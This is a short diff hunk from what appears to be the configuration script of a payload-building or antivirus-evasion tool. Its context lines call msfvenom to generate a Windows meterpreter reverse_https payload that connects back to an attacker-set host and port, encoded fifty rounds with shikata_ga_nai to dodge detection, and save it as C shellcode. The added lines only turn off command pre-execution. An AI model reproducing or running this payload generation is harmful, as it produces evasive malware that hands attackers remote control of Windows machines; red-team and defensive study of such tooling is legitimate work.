@@ -22,6 +22,10 @@ LHOST=$GLOBAL_LHOST
 # make meterpreter reverse payload, encoded 50 rounds with shikata_ga_nai
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 50 -f c -a x86 --platform Windows > input/sc_c.txt
 
+# no command preexec
+set_command_source none
+set_command_exec none
+
 # set shellcode source
 set_payload_source static_from_file input/sc_c.txt
 
